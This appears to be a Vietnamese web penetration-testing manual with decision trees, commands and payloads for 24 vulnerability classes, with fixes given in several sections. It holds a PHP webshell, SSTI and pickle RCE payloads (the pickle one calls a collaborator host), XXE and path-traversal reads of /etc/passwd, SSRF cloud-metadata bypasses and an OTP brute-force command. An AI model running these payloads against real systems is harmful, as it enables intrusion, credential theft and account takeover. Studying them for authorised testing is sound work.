# 02. CẨM NANG CHI TIẾT 24 LỚP LỖ HỔNG WEB (WEB VULNERABILITIES MANUAL)

Tài liệu này cung cấp hướng dẫn kỹ thuật chi tiết cho từng nút quyết định (node) trong sơ đồ tư duy khai thác, danh sách lệnh thực thi cụ thể, mã nguồn minh họa lỗi/vá lỗi, bảng bypass và kịch bản xâu chuỗi lỗi cho **24 lớp lỗ hổng Web**.

---

## 1. INSECURE DIRECT OBJECT REFERENCE (IDOR)

### 🌳 Cây quyết định IDOR
```
[PHÁT HIỆN THAM SỐ CHỨA ID]
  │
  ├── 1. Tạo 2 tài khoản cùng quyền (User A & User B) ➔ Node 1.1
  ├── 2. Tráo đổi ID của User A bằng ID User B trong request của User A ➔ Node 1.2
  └── 3. Bị chặn 403/401?
        ├── Có ➔ Thử các kỹ thuật Bypass (Method Swapping, HPP, Headers) ➔ Node 1.3
        └── Không (Thành công đọc/sửa dữ liệu) ➔ Xác nhận IDOR.
```

### 📌 Node 1.1: Chuẩn bị 2 tài khoản cùng cấp (Account Setup)
*   **Mô tả:** Để chứng minh lỗi IDOR, bắt buộc phải sử dụng hai tài khoản thử nghiệm có cùng phân quyền để chứng minh một tài khoản có thể can thiệp vào tài khoản kia mà không có sự cho phép.
*   **Quy trình:** Đăng ký User A (Token A, ID `101`) và User B (Token B, ID `102`).

### 📌 Node 1.2: Thực hiện kiểm thử tráo đổi ID (Direct ID Swapping)
*   **Lệnh thực thi mẫu (Curl):**
    ```bash
    curl -s -H "Authorization: Bearer Session_Token_A" "https://target.com/api/v1/invoices/102"
    ```
*   **Quyết định tiếp theo:** Nếu trả về HTTP 200 chứa dữ liệu của `102` ➔ [XÁC NHẬN IDOR READ]. Nếu trả về 403/401 ➔ Chuyển sang Node 1.3.

### 📌 Node 1.3: Thử nghiệm kỹ thuật Bypass IDOR khi bị chặn 403
*   **Các kỹ thuật và Payload:**
    *   *HTTP Method Swapping:* Đổi GET sang PUT, POST, PATCH hoặc DELETE.
    *   *HTTP Parameter Pollution (HPP):* `GET /api/v1/invoices?id=102&id=101`
    *   *Custom Headers:* Thêm `X-User-ID: 102`, `X-Original-User: 102`, `X-Org-ID: 102`.
    *   *Nested JSON:* `{"data": {"id": 102}}` thay vì `{"id": 102}`.
*   **Mã nguồn lỗi vs Vá lỗi (Node.js):**
    ```javascript
    // ❌ LỖI: Chỉ tìm theo ID từ client gửi lên
    app.get('/api/invoices/:id', async (req, res) => {
      const invoice = await Invoice.findById(req.params.id);
      res.json(invoice);
    });

    //   VÁ LỖI: Tìm ID kết hợp kiểm tra quyền sở hữu của user đang đăng nhập
    app.get('/api/invoices/:id', async (req, res) => {
      const invoice = await Invoice.findOne({ _id: req.params.id, userId: req.user.id });
      if (!invoice) return res.status(403).send("Access Denied");
      res.json(invoice);
    });
    ```
*   **Kịch bản Chaining:** IDOR đọc email/ID ➔ Truyền vào API reset mật khẩu ➔ ATO (Account Takeover).

---

## 2. SQL INJECTION (SQLi)

### 🌳 Cây quyết định SQLi
```
[PHÁT HIỆN Ô TÌM KIẾM/SẮP XẾP]
  │
  ├── 1. Gửi request baseline đo thời gian/dung lượng phản hồi ➔ Node 2.1
  ├── 2. Gửi Error-based probes (', ", )) ➔ Node 2.2
  │     ├── Hiện lỗi SQL ➔ Xác nhận SQLi Error-based
  │     └── Không hiện lỗi ➔ Node 2.3
  └── 3. Gửi Time-based blind probes (SLEEP, pg_sleep) ➔ Node 2.3
        ├── Có trễ ổn định (Statistical-Sample) ➔ Xác nhận SQLi Time-based ➔ Node 2.4
        └── Không trễ ➔ Dừng lại.
```

### 📌 Node 2.1: Gửi request baseline thiết lập mốc
*   **Lệnh thực thi:**
    ```bash
    curl -s -w "Time: %{time_total}s\n" -o /dev/null "https://target.com/api/products?sort=name"
    ```

### 📌 Node 2.2: Gửi Error-based probes (Gây lỗi cú pháp)
*   **Payloads:** `'`, `"`, `')`, `"))`, `ORDER BY 1--`
*   **Dấu hiệu:** Phản hồi chứa các từ khóa: `SQL syntax`, `MySQL`, `PostgreSQL`, `ORA-`.

### 📌 Node 2.3: Gửi Time-based blind probes
*   **Lệnh thực thi (MySQL/Postgre):**
    ```bash
    # MySQL Sleep
    curl -s -w "Time: %{time_total}s\n" -o /dev/null "https://target.com/api/products?sort=name' AND SLEEP(5)--"
    # Postgres pg_sleep
    curl -s -w "Time: %{time_total}s\n" -o /dev/null "https://target.com/api/products?sort=name';SELECT pg_sleep(5)--"
    ```
*   **Quy tắc:** Áp dụng **Statistical-Sample Rule** (10 lần gửi đan xen).

### 📌 Node 2.4: Khai thác tự động bằng sqlmap / ghauri
*   **Lệnh thực thi:**
    ```bash
    # Quét sâu với sqlmap tự động phát hiện và trích xuất DB
    sqlmap -u "https://target.com/api/products?sort=name" --batch --dbs --random-agent --level 3 --risk 2
    ```
*   **Mã nguồn lỗi vs Vá lỗi (PHP):**
    ```php
    // ❌ LỖI: Nối chuỗi trực tiếp vào câu lệnh SQL
    $id = $_GET['id'];
    $result = $conn->query("SELECT * FROM users WHERE id = " . $id);

    //   VÁ LỖI: Sử dụng Prepared Statements
    $stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
    $stmt->bind_param("i", $id);
    $stmt->execute();
    ```

---

## 3. NOSQL INJECTION (NoSQLi)

### 📌 Node 3.1: Kiểm thử toán tử logic JSON
*   **Mô tả:** Các cơ sở dữ liệu NoSQL (như MongoDB) sử dụng các toán tử logic để truy vấn. Nếu dữ liệu đầu vào dạng JSON không được lọc kiểu dữ liệu, attacker có thể thay đổi logic truy vấn.
*   **Payloads:**
    ```json
    {"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
    {"username": {"$gt": ""}}
    ```
*   **Lệnh thực thi:**
    ```bash
    curl -H "Content-Type: application/json" -d '{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}' https://target.com/api/login
    ```
*   **Quyết định:** Nếu đăng nhập thành công ➔ [XÁC NHẬN NoSQLi BYPASS].
*   **Vá lỗi (Node.js/Mongoose):** Sử dụng thư viện `mongo-sanitize` hoặc ép kiểu dữ liệu đầu vào về chuỗi (`String(req.body.username)`).

---

## 4. SERVER-SIDE REQUEST FORGERY (SSRF)

### 🌳 Cây quyết định SSRF
```
[THAM SỐ NHẬN URL (?url=)]
  │
  ├── 1. Gửi yêu cầu trỏ về máy chủ OOB (Burp Collaborator) ➔ Node 4.1
  │     ├── Không có callback ➔ Dừng lại (Không có SSRF)
  │     └── Có callback DNS/HTTP ➔ Node 4.2
  └── 2. Thử nghiệm bypass bộ lọc nội bộ và truy cập Cloud Metadata ➔ Node 4.2
```

### 📌 Node 4.1: Gửi yêu cầu trỏ về máy chủ OOB
*   **Lệnh thực thi:**
    ```bash
    curl "https://target.com/api/fetch?url=http://your-collaborator.oastify.com"
    ```
*   **Quy tắc:** Bắt buộc áp dụng **OOB-Or-It-Didn't-Happen Gate**.

### 📌 Node 4.2: Bypass bộ lọc IP nội bộ & Khai thác Cloud Metadata
*   **Bảng Bypass IP (11 kỹ thuật):**
    | Kỹ thuật | Payload | Giải thích |
    |---|---|---|
    | Decimal IP | `http://2130706433` | Tương đương `127.0.0.1` dạng số nguyên |
    | Hex IP | `http://0x7f000001` | Tương đương `127.0.0.1` dạng thập lục phân |
    | Octal IP | `http://0177.0.0.1` | Tương đương `127.0.0.1` dạng bát phân |
    | Short form | `http://127.1` | Rút gọn IP |
    | DNS Local | `http://localtest.me` | Domain công khai trỏ về `127.0.0.1` |
    | IPv6 Mapped | `http://[::1]` | IPv6 localhost |
    | Redirect 302 | Trỏ về server của hacker chứa mã chuyển hướng 302 | Vượt qua bộ lọc kiểm tra ban đầu |
    | DNS Rebinding | Sử dụng dịch vụ rebinder | Đổi IP sau bước kiểm tra (TOCTOU) |
    | AWS Metadata | `http://169.254.169.254/latest/meta-data/` | Đọc AWS Credentials |
    | GCP Metadata | `http://metadata.google.internal/computeMetadata/v1/` | Đọc GCP Access Token |
    | Azure IMDS | `http://169.254.169.254/metadata/instance` | Đọc Azure Credentials |

---

## 5. CROSS-SITE SCRIPTING (XSS)

### 🌳 Cây quyết định XSS
```
[PHÁT HIỆN THAM SỐ PHẢN CHIẾU HOẶC Ô NHẬP LIỆU]
  │
  ├── 1. Gửi chuỗi Marker duy nhất cpmark987abc ➔ Node 5.1
  │     ├── Marker phản chiếu trong HTML ➔ Node 5.2 (XSS Reflected)
  │     └── Marker lưu lại trong DB và tải ra trang khác ➔ Node 5.2 (XSS Stored)
  ├── 2. Phân tích ngữ cảnh phản chiếu để chọn payload phù hợp ➔ Node 5.2
  └── 3. Kiểm tra JavaScript Source sink rò rỉ ➔ Node 5.3 (DOM XSS)
```

### 📌 Node 5.1: Gửi chuỗi Marker duy nhất
*   **Lệnh thực thi:**
    ```bash
    curl -s "https://target.com/search?q=cpmark987abc" | grep "cpmark987abc"
    ```

### 📌 Node 5.2: Chọn Payload XSS theo ngữ cảnh
*   **Ngữ cảnh & Payloads:**
    *   *Nằm ngoài thẻ HTML:* `<svg onload=alert(document.domain)>` hoặc `<img src=x onerror=alert(1)>`
    *   *Nằm trong thuộc tính thẻ (`<input value="MARKER">`):* `" autofocus onfocus=alert(1) x="`
    *   *Nằm trong khối Script (`var x = 'MARKER';`):* `';alert(1);//` hoặc `'-alert(1)-'`

### 📌 Node 5.3: Phát hiện DOM XSS qua JavaScript Sinks
*   **Dấu hiệu (Sinks nguy hiểm):** `innerHTML`, `outerHTML`, `document.write(`, `eval(`, `location.href`.
*   **Cách kiểm thử:** Sử dụng DevTools Console, tiêm payload vào hash hoặc query parameter (Ví dụ: `https://target.com/#<img src=x onerror=alert(1)>`).

---

## 6. FILE UPLOAD BYPASS

### 🌳 Cây quyết định File Upload
```
[CHỨC NĂNG TẢI LÊN FILE]
  │
  ├── 1. Tải lên webshell php tiêu chuẩn shell.php ➔ Node 6.1
  ├── 2. Bị chặn?
        ├── Có ➔ Thực hiện kỹ thuật Bypass bộ lọc (Đuôi file, Content-Type, Magic Bytes) ➔ Node 6.2
        └── Không (Tải thành công) ➔ Truy cập đường dẫn file và chạy lệnh cmd.
```

### 📌 Node 6.1: Tải lên Webshell tiêu chuẩn
*   **Nội dung webshell (shell.php):**
    ```php
    <?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); } ?>
    ```

### 📌 Node 6.2: Các kỹ thuật Bypass bộ lọc File Upload
*   **Danh sách Bypass:**
    *   *Thay đổi đuôi file:* `.phtml`, `.php5`, `.phar`, `.pHp`, `.svg` (chứa script XSS).
    *   *Thay đổi Content-Type:* Đổi thành `image/jpeg` hoặc `image/png`.
    *   *Thêm Magic Bytes:* Chèn `GIF89a;` vào dòng đầu tiên của tệp tin.
    *   *Null Byte Injection (PHP phiên bản cũ):* `shell.php%00.jpg`.

---

## 7. XML EXTERNAL ENTITY (XXE)

### 📌 Node 7.1: Gửi payload định nghĩa thực thể bên ngoài
*   **Mô tả:** Nếu ứng dụng nhận đầu vào dạng XML và cấu hình bộ phân tích cú pháp (XML Parser) cho phép thực thể bên ngoài, attacker có thể đọc file cục bộ hoặc SSRF.
*   **Payload đọc file hệ thống:**
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <user><username>&xxe;</username><password>123456</password></user>
    ```
*   **Vá lỗi (Java DocumentBuilderFactory):**
    ```java
    dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    ```

---

## 8. CROSS-SITE REQUEST FORGERY (CSRF)

### 📌 Node 8.1: Tạo Form tự động gửi Request (PoC Exploit)
*   **Mô tả:** Ép trình duyệt của nạn nhân thực hiện một request thay đổi trạng thái (như đổi email, đổi mật khẩu) bằng cách dụ họ click vào trang web độc hại.
*   **Mẫu PoC HTML:**
    ```html
    <form action="https://target.com/api/user/update" method="POST" id="csrfForm">
      <input type="hidden" name="email" value="attacker@evil.com" />
    </form>
    <script>document.getElementById('csrfForm').submit();</script>
    ```
*   **Bypass CSRF Token:** Xóa tham số token, đổi POST sang GET, gửi token trống hoặc sử dụng token của tài khoản khác.

---

## 9. CORS MISCONFIGURATION

### 📌 Node 9.1: Kiểm tra phản hồi với Header Origin tùy ý
*   **Mô tả:** Máy chủ cấu hình CORS sai cho phép mọi domain đọc dữ liệu phản hồi nhạy cảm.
*   **Lệnh thực thi:**
    ```bash
    curl -s -I -H "Origin: https://evil.com" "https://target.com/api/dashboard"
    ```
*   **Dấu hiệu lỗi:** Phản hồi chứa cả hai header:
    *   `Access-Control-Allow-Origin: https://evil.com`
    *   `Access-Control-Allow-Credentials: true`
*   **Vá lỗi:** Không bao giờ phản chiếu trực tiếp header `Origin` của request vào `Access-Control-Allow-Origin`. Sử dụng danh sách cho phép (Allowlist).

---

## 10. WEB CACHE POISONING & CACHE DECEPTION

### 📌 Node 10.1: Web Cache Poisoning (Đầu độc bộ nhớ đệm)
*   **Mô tả:** Gửi một tiêu đề HTTP không được chọn làm cache key (Unkeyed Header) khiến cache server lưu lại nội dung phản hồi độc hại và phân phối cho người dùng tiếp theo.
*   **Lệnh thực thi:**
    ```bash
    curl -H "X-Forwarded-Host: evil.com" "https://target.com/static/js"
    ```
*   **Dấu hiệu:** Nếu phản hồi chứa liên kết tải tài nguyên trỏ đến `evil.com` VÀ có header `X-Cache: HIT` hoặc `CF-Cache-Status: HIT` ➔ Lỗi xác nhận.

### 📌 Node 10.2: Web Cache Deception (Đánh lừa bộ nhớ đệm)
*   **Mô tả:** Dụ nạn nhân click link dạng `https://target.com/api/profile/user.css` (đường dẫn API nhạy cảm nhưng có đuôi file tĩnh). Cache server tưởng đây là file tĩnh nên lưu lại thông tin nhạy cảm của nạn nhân công khai cho attacker tải về.

---

## 11. HTTP REQUEST SMUGGLING

### 📌 Node 11.1: Kiểm thử CL.TE & TE.CL
*   **Mô tả:** Khai thác sự bất đồng bộ trong việc tính toán độ dài request giữa Frontend Proxy và Backend Server.
*   **Payload CL.TE (Frontend dùng Content-Length, Backend dùng Transfer-Encoding):**
    ```http
    POST / HTTP/1.1
    Host: target.com
    Content-Length: 13
    Transfer-Encoding: chunked

    0

    SMUGGLED
    ```
*   **Công cụ:** Sử dụng tiện ích mở rộng **HTTP Request Smuggler** trên Burp Suite để kiểm thử tự động.

---

## 12. SERVER-SIDE TEMPLATE INJECTION (SSTI)

### 📌 Node 12.1: Gửi toán tử số học
*   **Payload phát hiện:** `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`, `#{7*7}`.
*   **Dấu hiệu:** Trang phản hồi hiển thị kết quả là `49` thay vì hiển thị nguyên văn chuỗi nhập vào.
*   **Payload RCE (Jinja2 / Python):**
    ```python
    {{self.__init__.__globals__.__specs__['os'].popen('id').read()}}
    ```

---

## 13. HOST HEADER INJECTION

### 📌 Node 13.1: Thay thế tiêu đề Host trong Password Reset
*   **Mô tả:** Đổi tiêu đề `Host` của request reset mật khẩu thành máy chủ của attacker. Nếu máy chủ sử dụng tiêu đề `Host` để sinh liên kết gửi vào email của nạn nhân, liên kết đó sẽ trỏ về server của hacker.
*   **Lệnh thực thi:**
    ```bash
    curl -H "Host: evil.com" -d "email=victim@target.com" "https://target.com/api/password/reset"
    ```

---

## 14. GRAPHQL SECURITY

### 📌 Node 14.1: Đọc lược đồ cấu trúc (GraphQL Introspection)
*   **Mô tả:** Nếu không tắt Introspection trên Production, attacker có thể tải về toàn bộ danh sách các truy vấn (Queries) và đột biến (Mutations) của hệ thống.
*   **Lệnh thực thi:**
    ```bash
    curl -H "Content-Type: application/json" -d '{"query": "{ __schema { queryType { fields { name } } } }"}' https://target.com/graphql
    ```
*   **Khai thác sâu:**
    *   *GraphQL IDOR:* Truy vấn `node(id: "VICTIM_ID")`.
    *   *GraphQL DoS (Nested queries):* Gửi truy vấn lồng nhau vô hạn khiến server cạn kiệt tài nguyên:
        `query { author { books { author { books { ... } } } } }`

---

## 15. WEBSOCKETS SECURITY

### 📌 Node 15.1: Kiểm thử Cross-Site WebSocket Hijacking (CSWSH)
*   **Mô tả:** WebSocket không tự động áp dụng chính sách Same-Origin Policy. Nếu ứng dụng dựa vào Cookie để xác thực kết nối WebSocket, một trang web bên thứ ba có thể thiết lập kết nối WebSocket nhân danh nạn nhân.
*   **Quy trình:** Tạo file HTML kết nối đến địa chỉ WebSocket của mục tiêu (`wss://target.com/chat`) từ máy chủ của bạn (`https://evil.com`). Nếu kết nối thành công mà không bị chặn bởi kiểm tra Origin ➔ Lỗi xác nhận.

---

## 16. LDAP INJECTION

### 📌 Node 16.1: Gửi ký tự wildcard (*) và logic toán tử
*   **Mô tả:** Lỗi xảy ra khi dữ liệu người dùng nhập được đưa trực tiếp vào chuỗi truy vấn LDAP để xác thực hoặc tìm kiếm danh bạ mà không qua lọc ký tự.
*   **Payloads:**
    *   Bypass đăng nhập: `*` hoặc `*)(&`
    *   Ví dụ logic: `(user=admin)(|(*))`
*   **Vá lỗi:** Sử dụng các thư viện an toàn để mã hóa ký tự đặc biệt (như `LDAPEncoder`).

---

## 17. SUBDOMAIN TAKEOVER

### 📌 Node 17.1: Phát hiện bản ghi CNAME mồ côi (Dangling DNS)
*   **Mô tả:** Domain phụ của mục tiêu trỏ CNAME về một dịch vụ bên thứ ba (như AWS S3, GitHub Pages, Heroku) nhưng dịch vụ đó đã bị gỡ bỏ.
*   **Dấu hiệu phát hiện:**
    ```bash
    # Tra cứu bản ghi CNAME
    dig CNAME dev.target.com +short
    # Kết quả trỏ về: mybucket.s3.amazonaws.com
    # Truy cập URL trả về lỗi: NoSuchBucket (AWS) hoặc 404 Site Not Found (GitHub Pages)
    ```
*   **Khai thác:** Đăng ký một bucket trùng tên `mybucket` trên tài khoản AWS của bạn để hiển thị nội dung tùy ý dưới domain phụ `dev.target.com`.

---

## 18. INSECURE DESERIALIZATION

### 📌 Node 18.1: Khai thác giải tuần tự hóa Python Pickle
*   **Mô tả:** Khai thác việc giải mã đối tượng nhị phân không an toàn để thực thi mã hệ thống.
*   **Mã khai thác tạo Payload (Python):**
    ```python
    import pickle, base64, os
    class Exploit(object):
        def __reduce__(self):
            return (os.system, ('curl http://your-collaborator.oastify.com',))
    print(base64.b64encode(pickle.dumps(Exploit())))
    ```
*   **Vá lỗi (Python):** Tuyệt đối không dùng `pickle.loads()` trên dữ liệu do người dùng gửi lên. Thay thế bằng các định dạng dữ liệu an toàn như JSON hoặc Protocol Buffers.

---

## 19. API MISCONFIGURATION & MASS ASSIGNMENT

### 📌 Node 19.1: Khai thác Mass Assignment (Gán thuộc tính hàng loạt)
*   **Mô tả:** Lập trình viên truyền trực tiếp toàn bộ dữ liệu request body từ người dùng vào hàm khởi tạo hoặc cập nhật đối tượng của ORM (như `User.update(req.body)`). Attacker có thể chèn các tham số ẩn để nâng quyền.
*   **Kịch bản kiểm thử:**
    *   *Request gửi đi ban đầu:* `{"name": "Nguyen"}`
    *   *Payload tấn công:* `{"name": "Nguyen", "is_admin": true, "role": "OWNER"}`
*   **Vá lỗi:** Sử dụng cơ chế chọn lọc thuộc tính (Allowlist/Strong Parameters) trong framework. Ví dụ trong Laravel sử dụng `$fillable` hoặc `$guarded`.

---

## 20. AUTHENTICATION BYPASS & PRIVILEGE ESCALATION

### 📌 Node 20.1: Kiểm thử Cookie Tampering (Thay đổi Cookie)
*   **Mô tả:** Thay đổi giá trị của Cookie để đóng vai người dùng khác hoặc nâng quyền Admin.
*   **Kỹ thuật:**
    *   Giải mã Base64 Cookie để kiểm tra cấu trúc JSON (như `{"user": "guest", "admin": false}`).
    *   Thay đổi sang `{"user": "admin", "admin": true}`, mã hóa ngược lại Base64 và gửi đi.
    *   Kiểm tra JSON Web Token (JWT) xem có bị lỗi thuật toán `none` (`"alg": "none"`) cho phép bỏ qua chữ ký số hay không.

---

## 21. REMOTE CODE EXECUTION (RCE)

### 📌 Node 21.1: Khai thác Command Injection qua ký tự ngắt lệnh
*   **Mô tả:** Tiêm lệnh hệ thống trực tiếp vào các hàm thực thi shell.
*   **Ký tự ngắt lệnh phổ biến:** `;`, `&`, `|`, `\n`, `` ` ``, `$()`.
*   **Payload thực chiến:**
    ```bash
    # Đọc file passwd
    target_param=127.0.0.1; cat /etc/passwd
    # Kiểm tra mù qua ping
    target_param=127.0.0.1; ping -c 5 127.0.0.1
    ```
*   **Vá lỗi:** Không bao giờ truyền tham số trực tiếp vào shell. Sử dụng các API thực thi tiến trình an toàn (như `execFile` thay vì `exec` trong Node.js).

---

## 22. LFI / RFI (LOCAL & REMOTE FILE INCLUSION)

### 📌 Node 22.1: Khai thác Path Traversal đọc file hệ thống
*   **Mô tả:** Di chuyển ngược thư mục thông qua các ký tự `../` để đọc các file nằm ngoài thư mục web được chỉ định.
*   **Payloads:**
    ```
    ../../../../etc/passwd
    ..%2f..%2f..%2f..%2fetc%2fpasswd
    ..%252f..%252f..%252f..%252fetc%252fpasswd (Double URL Encoding)
    ```
*   **Lệnh thực thi:**
    ```bash
    curl "https://target.com/api/view?file=../../../../etc/passwd"
    ```

---

## 23. RACE CONDITIONS

### 📌 Node 23.1: Tấn công đồng thời (Concurrency Attack)
*   **Mô tả:** Gửi nhiều request cùng một thời điểm cực nhỏ (mili giây) để tận dụng khoảng thời gian trễ giữa lúc hệ thống kiểm tra số dư và lúc thực hiện trừ tiền.
*   **Quy trình kiểm thử bằng curl song song:**
    ```bash
    # Gửi song song 5 yêu cầu rút tiền cùng một lúc
    for i in {1..5}; do
      curl -s -H "Authorization: Bearer Token" "https://target.com/api/withdraw" -d "amount=100" &
    done
    wait
    ```
*   **Dấu hiệu:** Tài khoản bị rút âm tiền vượt quá hạn mức cho phép.

---

## 24. MFA BYPASS & ACCOUNT TAKEOVER (ATO)

### 📌 Node 24.1: Kiểm thử Brute-force mã xác thực MFA OTP
*   **Mô tả:** Nếu hệ thống không giới hạn số lần thử (Rate Limiting) trên endpoint nhập mã xác thực OTP 4-6 số, attacker có thể brute-force thành công mã trong vài phút.
*   **Lệnh thực thi sử dụng ffuf:**
    ```bash
    # Tạo danh sách mã OTP từ 000000 đến 999999
    seq -f "%06g" 0 999999 > /tmp/otp_list.txt
    # Chạy brute force
    ffuf -w /tmp/otp_list.txt -u "https://target.com/api/mfa/verify" -X POST -H "Content-Type: application/json" -d '{"email":"victim@target.com", "code":"FUZZ"}' -mr "success" -t 50
    ```
*   **Kỹ thuật Bypass MFA khác:** Thay đổi phản hồi của server từ `{"mfa_verified": false}` thành `true` trên client-side proxy (Response Manipulation) để xem ứng dụng có cho phép đi tiếp không.
